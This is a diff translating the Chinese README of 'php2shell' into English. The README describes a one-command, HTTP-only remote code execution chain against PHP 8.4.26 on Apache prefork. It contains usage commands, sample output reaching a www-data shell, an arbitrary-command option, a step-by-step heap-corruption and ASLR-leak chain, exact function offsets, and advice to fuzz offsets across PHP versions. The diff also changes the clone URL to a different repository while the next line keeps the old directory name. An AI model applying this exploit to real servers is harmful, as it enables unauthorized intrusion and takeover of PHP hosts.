@@ -1,27 +1,36 @@
-# php2shell - 官方环境 无需display_errors，不修改memory_limit
+# php2shell - Official environment, no `display_errors` needed, `memory_limit` untouched
 
-中文 | [English](readme_en.md)
+[中文](README.md) | English
 
-**官方 prefork 配置（MaxRequestWorkers=150）下**，在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
-PHP 的约束下，一条命令拿到 RCE：
+**Official prefork configuration (MaxRequestWorkers=150).** In a fully
+remote, HTTP-only setting, with only `<?php echo "OK\n"; ?>` on the target
+page and no PHP written on the target side, one command reaches RCE:
 
-- stock 官方镜像 + 官方 ini + 官方 worker：**10/10**
-- 单 worker 基线（早期标定/调试）：**20/20**
-- 单次约 3–4 秒（含 149 个占位连接），被固定的 worker 不重启，目标 ini 未改
+- stock official image + official ini + official workers: **10/10**
+- single-worker baseline (early calibration/debugging): **20/20**
+- about 3-4 seconds per run (including 149 held connections); the pinned
+  worker is not restarted and the target ini is left untouched
 
-# 通用利用
+# General exploitation
 
-理论上只要你计算出所有php版本的偏移，然后利用这些偏移批量去fuzz，总有一条fuzz是能rce的。反正worker崩了也会重启，不怕目标打挂。
+In principle, once you compute the offsets for every PHP version and fuzz
+with them in bulk, one of those fuzz runs will eventually reach RCE.
+Besides, a crashed worker restarts anyway, so there is no fear of knocking
+the target offline.
 
-关于 worker：官方 prefork 的 `MaxRequestWorkers=150` 也已打通。脚本先占住 149 个 worker 的未完成请求，再把 A1/B1/A2/B2 固定到剩下的同一个 child；单 worker 只是早期的调试形态（`--workers 1` 仍可复现）。
+As for workers: the official prefork `MaxRequestWorkers=150` setup is now
+supported too. The script holds 149 workers with incomplete requests and
+pins A1/B1/A2/B2 to the one remaining child; the single-worker setup was
+only an early debug form (`--workers 1` still reproduces it).
 
-## 快速开始（官方 php.ini-production / display_errors=Off / 128M）
+## Quick start (official php.ini-production / display_errors=Off / 128M)
 
 ```bash
-git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
+git clone https://github.com/MRdark-ops/php2shell.git
 cd php2shell-bypass-aslr-exp
 
-# 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
+# 1) Start the target: stock official image; the container only copies the
+#    official php.ini-production to php.ini.
 ./pure/run_pure.sh
 # target: OK
 # PHP 8.4.26 ...
@@ -29,7 +38,7 @@ cd php2shell-bypass-aslr-exp
 # memory_limit => 128M => 128M
 # workers: official (run exploit with --workers 150)
 
-# 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
+# 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
 python3 exploit.py --port 18110
 #       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
@@ -42,94 +51,105 @@ python3 exploit.py --port 18110
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
-`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，默认使用
-官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际 ini 和 MPM
-值；`--single` 才挂单 worker 的 `docker/apache.conf`（配合 `--workers 1`）。
-Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
-`DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
-同一构建做离线标定。
+No PHP/Apache build, no image build, no gdb, no ini changes.
+`pure/run_pure.sh` uses container `p2s-pure-18110` on port `18110` by
+default with the image's official prefork configuration
+(MaxRequestWorkers=150), and prints the effective ini and MPM values.
+`--single` mounts the one-worker `docker/apache.conf` instead (use it with
+`--workers 1`). On Linux without docker-group access the script falls back
+to `sudo docker`; you can also force
+`DOCKER="sudo docker" ./pure/run_pure.sh`. `--dbg` only switches to the
+symbolic build of the same official version for offline calibration.
 
-常用参数：
+Common options:
 
 ```bash
-# 换新 ASLR 复测（重启容器）
+# Re-test with fresh ASLR (restart the container)
 python3 exploit.py --port 18110 --restart p2s-pure-18110
 
-# 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
+# Official workers are the default; --workers 1 is for a --single target
 python3 exploit.py --port 18110 --workers 1
 
-# 自定义命令：把脚本写进挂载目录，再用 sh 执行
+# Arbitrary command: write a script into the mounted directory, then run sh
 printf 'id; uname -a > /out/p1\n' > out/c
 python3 exploit.py --port 18110 --cmd 'sh</out/c'
 ```
 
-`--retries` 默认 3；如果某次越界窗口里最常见的指针不是
-`zval_ptr_dtor`，脚本会用 `libphp-main` 的合理区间检查丢弃这次泄漏，
-整条链重来。
+`--retries` defaults to 3. If the most common pointer in an OOB window is
+not `zval_ptr_dtor`, the script rejects that leak via the plausible
+`libphp-main` delta check and reruns the whole chain.
 
-## 这条纯 HTTP 链
+## The pure-HTTP chain
 
-目标页面只有 `<?php echo "OK\n"; ?>`，攻击流量只有 chunked multipart
-和普通 GET/POST：
+The target page is only `<?php echo "OK\n"; ?>`; the attack traffic is
+chunked multipart plus ordinary GET/POST:
 
-0. **worker pinning**：官方 `MaxRequestWorkers=150`；先开 149 个只发了
-   一半 body 的 POST 占住其它 child，A1/B1/A2/B2 就都会落到剩下的同一个
-   child，跨请求的悬空指针才有效。
-1. **chunked 绕过 `post_max_size`**：不带 `Content-Length` 时
-   `content_length=0`，`rfc1867_post_handler` 开头的检查被跳过，
-   可以发送远大于 8M 的 body 做堆整形。
-2. **A1**：860 个 depth-64 嵌套文件字段 + filler + 大值 + 4000B
-   `PHP_SESSION_UPLOAD_PROGRESS`，在 END cleanup 的 `php_url_encode`
-   里 OOM；bailout 留下悬空的 `PS(id)` / `PS(mod_data)`，`send_cookie=1`。
-3. **B1（越界读）**：安全 close 后让 `PS(id)` 指向伪造的
-   `zend_string` 头（len=0xC8000，data 含 `/`），`Set-Cookie` 把 id
-   chunk 之后 800KB 内存编码出来。窗口里同时有：
-   - 2MiB 对齐的 chunk 指针簇 → id chunk / main chunk base；
-   - `G:400` 在 id chunk 尾部留下的洞被 900 个嵌套数组字段填满，
-     真实 HashTable 的 `pDestructor = zval_ptr_dtor` 出现 1095 次
-     → `libphp = 值 - 0x65EB60`。
-4. **A2 + B2**：cheap-OOM 把 `PS(hash_serialize_verifier)` 指到堆上
-   (`main+0x7D720`)；B2 用 384B 引用值把它覆盖成指向
-   `S=main+0xF8398` 的 zval，S 处伪造 zend_array 的
-   `pDestructor = zif_system` (`libphp+0x465370`)，shutdown 时
-   `zend_hash_destroy` 调用 `system("id>/out/p1")`。
+0. **Worker pinning**: with the official `MaxRequestWorkers=150`, the script
+   first holds 149 children with incomplete POST bodies, so A1/B1/A2/B2 all
+   land on the one remaining child and the cross-request dangling pointers
+   stay valid.
+1. **Chunked bypass of `post_max_size`**: without `Content-Length`,
+   `content_length=0`, so the check at the top of
+   `rfc1867_post_handler` is skipped; bodies far larger than 8M can be
+   used for heap shaping.
+2. **A1**: 860 depth-64 nested file fields + fillers + large values + a
+   4000B `PHP_SESSION_UPLOAD_PROGRESS`, causing an OOM inside
+   `php_url_encode` during END cleanup. The bailout leaves dangling
+   `PS(id)` / `PS(mod_data)` and `send_cookie=1`.
+3. **B1 (OOB read)**: after a safe close, `PS(id)` points at a forged
+   `zend_string` header (len=0xC8000, data containing `/`), and
+   `Set-Cookie` encodes 800KB of memory starting at the id chunk. The
+   window contains:
+   - 2MiB-aligned chunk pointer clusters -> id chunk / main chunk base;
+   - the hole left by `G:400` at the tail of the id chunk is filled by
+     900 nested-array fields; the real HashTables' `pDestructor =
+     zval_ptr_dtor` appears 1095 times -> `libphp = value - 0x65EB60`.
+4. **A2 + B2**: cheap-OOM points `PS(hash_serialize_verifier)` into the
+   heap (`main+0x7D720`); B2 overwrites it with a 384B reference value
+   that points at a zval at `S=main+0xF8398`. The fake zend_array at S
+   has `pDestructor = zif_system` (`libphp+0x465370`); during shutdown
+   `zend_hash_destroy` calls `system("id>/out/p1")`.
 
-偏移（本构建，ASLR 无关）：
+Offsets (this build, ASLR-independent):
 
-| 符号/位置 | 值 |
+| Symbol/location | Value |
 |---|---|
 | `zval_ptr_dtor` | `libphp+0x65EB60` |
 | `zif_system` | `libphp+0x465370` |
 | fake array `S` | `main+0xF8398` |
-| A2 的 `hsv` | `main+0x7D720` |
+| A2 `hsv` | `main+0x7D720` |
 
-目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
-mod_php、files session handler。换 PHP 构建/版本需要重新标定偏移；
-ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
+Target environment: Debian 13 (trixie), Apache 2.4.69 prefork, PHP 8.4.26
+NTS mod_php, files session handler. A different PHP build/version needs
+fresh offsets; ASLR changes per container start, and the two leaks in the
+chain derive it at runtime.
 
-## 证据
+## Evidence
 
-- 机制与标定：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
-- 全链脚本：[exploit.py](exploit.py)（`pure/pwn_pure.py` 保留为别名）
-- 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
-- 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
-- 官方 worker 日志：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
-- proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
+- Mechanism and calibration: [pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
+- Full-chain script: [exploit.py](exploit.py) (`pure/pwn_pure.py` remains as an alias)
+- Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
+- Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
+- Official-worker log: [pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
+- Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
 
-## 旧线（legacy，非本目标）
+## Legacy (not the target)
 
-早期提交里的 `exploit.py` 走的是**自定义** `docker/php.ini`
-（`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`），
-与本 README 的官方配置目标无关，已归档到
-[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py)；
-同目录下的 [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
-[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) 等描述的是那一线。
+The early `exploit.py` used a **custom** `docker/php.ini`
+(`display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`). It is
+unrelated to the official-config target above and is archived at
+[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py); the docs in
+the same directory, such as
+[HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md) and
+[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md), describe that
+line.
 
-## 复现声明
+## Reproduction statement
 
-- 目标配置就是官方 `php.ini-production`（`display_errors=Off`、
-  `memory_limit=128M`）和官方 prefork worker（MaxRequestWorkers=150）：
-  没有自定义 ini、没有 `display_errors=On` 依赖、没有目标侧文件、
-  没有 `session_start()`、交付路径不用 gdb。
-- 仅用于授权环境中的漏洞研究与复现。
+- The target configuration is the official `php.ini-production`
+  (`display_errors=Off`, `memory_limit=128M`) with the official prefork
+  workers (MaxRequestWorkers=150): no custom ini, no `display_errors=On`
+  dependency, no target-side files, no `session_start()`, and no gdb on the
+  delivery path.
+- For vulnerability research and reproduction in authorized environments
+  only.
